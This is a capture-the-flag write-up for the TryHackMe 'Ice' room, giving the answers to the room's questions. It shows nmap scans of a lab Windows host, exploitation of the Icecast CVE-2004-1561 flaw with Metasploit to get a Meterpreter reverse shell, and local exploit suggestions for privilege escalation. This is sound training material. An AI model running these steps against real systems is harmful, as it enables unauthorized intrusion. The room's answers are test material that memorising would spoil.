# Ice

Room: [Ice](https://tryhackme.com/room/ice)

Prerequisites: 
1. [Nmap](https://tryhackme.com/room/furthernmap)
2. [Metasploit: Introduction](https://tryhackme.com/room/metasploitintro)

<img width="935" height="206" alt="image" src="https://github.com/user-attachments/assets/3d944a7e-dee2-43cd-bc1d-48fb376c5b83" />

## Connect

Connect to the TryHackMe network! Please note that this machine does not respond to ping (ICMP) and may take a few minutes to boot up.

You can check how to connect through the [OpenVPN](https://tryhackme.com/room/openvpn) room.

Write the command: `sudo openvpn <filename>`

## Recon

### Answer the questions below

1. Deploy the machine! This may take up to three minutes to start.

Start the Lab Machine.

2. Launch a scan against our lab machine, I recommend using a SYN scan set to scan all ports on the machine.

Command to scan all the ports with SYN Scan: `nmap -sS -p- -T4 TARGET_IP`

Performs a TCP SYN (half-open) scan without completing the TCP three-way handshake. It's faster than a full TCP connect scan.

<img width="345" height="218" alt="image" src="https://github.com/user-attachments/assets/60c9716d-7ae4-4038-bb07-6464790e9e16" />

3. Once the scan completes, we'll see a number of interesting ports open on this machine. As you might have guessed, the firewall has been disabled (with the service completely shutdown), leaving very little to protect this machine. One of the more interesting ports that is open is Microsoft Remote Desktop (MSRDP). What port is this open on?

3389

We can see that the firewall must be disabled as we can see ports like RDP (3389), SMB (445) and RPC (135), like on normal Windows Firewall Defender, these are normally blocked or restricted to be accessible by the public.

4. What service did nmap identify as running on port 8000? (First word of this service)

Icecast, by command: `nmap -sC -sV -p8000 TARGET_IP`

<img width="479" height="124" alt="image" src="https://github.com/user-attachments/assets/7fce9c31-89fe-4706-8d7b-65ad2b20515e" />

5. What does Nmap identify as the hostname of the machine? (All caps for the answer)

DARK-PC, by command: `nmap -sC -sV -p- TARGET_IP`

<img width="563" height="326" alt="image" src="https://github.com/user-attachments/assets/b896370b-5807-4bc3-b826-de101e29c172" />

## Gain Access

You can refer to the [Icecast Exploit -Rapid7](https://www.rapid7.com/db/modules/exploit/windows/http/icecast_header/) to know about the vulnerability.

### Answer the questions below

1. Now that we've identified some interesting services running on our lab machine, let's do a little bit of research into one of the weirder services identified: Icecast. Icecast, or well at least this version running on our target, is heavily flawed and has a high level vulnerability with a score of 7.5 (7.4 depending on where you view it). What is the Impact Score for this vulnerability? Use [CVE Details: CVE-2004-1561](https://www.cvedetails.com) for this question and the next.

6.4

<img width="781" height="97" alt="image" src="https://github.com/user-attachments/assets/18ce7b7b-42eb-4f9f-9c2a-cc42c7274ad6" />

2. What is the CVE number for this vulnerability? This will be in the format: CVE-0000-0000

CVE-2004-1561

3. Now that we've found our vulnerability, let's find our exploit. For this section of the room, we'll use the Metasploit module associated with this exploit. Let's go ahead and start Metasploit using the command `msfconsole`

<img width="425" height="347" alt="image" src="https://github.com/user-attachments/assets/6393a480-eccc-4eb3-9877-98ddfa2dcda2" />

4. After Metasploit has started, let's search for our target exploit using the command `search icecast`. What is the full path (starting with exploit) for the exploitation module? 

`exploit/windows/http/icecast_header`

<img width="565" height="141" alt="image" src="https://github.com/user-attachments/assets/810a9e18-3c01-4af6-a4e3-fa3e21707f31" />

5. Let's go ahead and select this module for use. Type either the command `use icecast` or `use 0` to select our search result.

<img width="379" height="38" alt="image" src="https://github.com/user-attachments/assets/40a20a01-0129-46a5-86e6-0930d9902eca" />

6. Following selecting our module, we now have to check what options we have to set. Run the command `show options`. What is the only required setting which currently is blank?

RHOSTS

<img width="1431" height="607" alt="image" src="https://github.com/user-attachments/assets/b95954d6-1d89-48f0-92cc-3039ce4b5b34" />

7. First let's check that the LHOST option is set to our tun0 IP (which can be found on the access page). With that done, let's set that last option to our target IP. Now that we have everything ready to go, let's run our exploit using the command `exploit`.

First set up your LHOSTS with your tun0 IP which you can also see by command: `ifconfig` and then do command: `set LHOST TUN0_IP`

<img width="1423" height="279" alt="image" src="https://github.com/user-attachments/assets/0f997bba-8d5f-4910-9a35-b2d0edaddfb1" />

Now do the command: `exploit`, you get one session:

<img width="1078" height="136" alt="image" src="https://github.com/user-attachments/assets/b70768c3-e397-4ee2-bc6b-bd60a876dd1f" />

## Escalate

### Answer the questions below

1. Woohoo! We've gained a foothold into our victim machine! What's the name of the shell we have now?

Meterpreter

2. What user was running that Icecast process?

Dark, by command `getuid` where `Dark-PC` is the hostname and Dark is the user:

<img width="158" height="38" alt="image" src="https://github.com/user-attachments/assets/88bbd4da-7604-4d00-999c-e19f9bf9fe08" />

3. What build of Windows is the system?

7601 by command `sysinfo` under the OS:

<img width="317" height="108" alt="image" src="https://github.com/user-attachments/assets/d07fdd43-68d9-46d2-aeb1-5fa45bd597cf" />

4. Now that we know some of the finer details of the system we are working with, let's start escalating our privileges. First, what is the architecture of the process we're running?

x64 under the Architecture.

5. Now that we know the architecture of the process, let's perform some further recon. While this doesn't work the best on x64 machines, let's now run the following command `run post/multi/recon/local_exploit_suggester`. *This can appear to hang as it tests exploits and might take several minutes to complete*

<img width="850" height="315" alt="image" src="https://github.com/user-attachments/assets/adb267d7-8c04-4957-b2b9-739e72d13893" />

6. Running the local exploit suggester will return quite a few results for potential escalation exploits. What is the full path (starting with exploit/) for the first returned exploit?

`exploit/windows/local/bypassuac_eventvwr`

<img width="845" height="215" alt="image" src="https://github.com/user-attachments/assets/ffedd5c2-cb2c-4ddd-8e64-8b5d4c30321b" />



















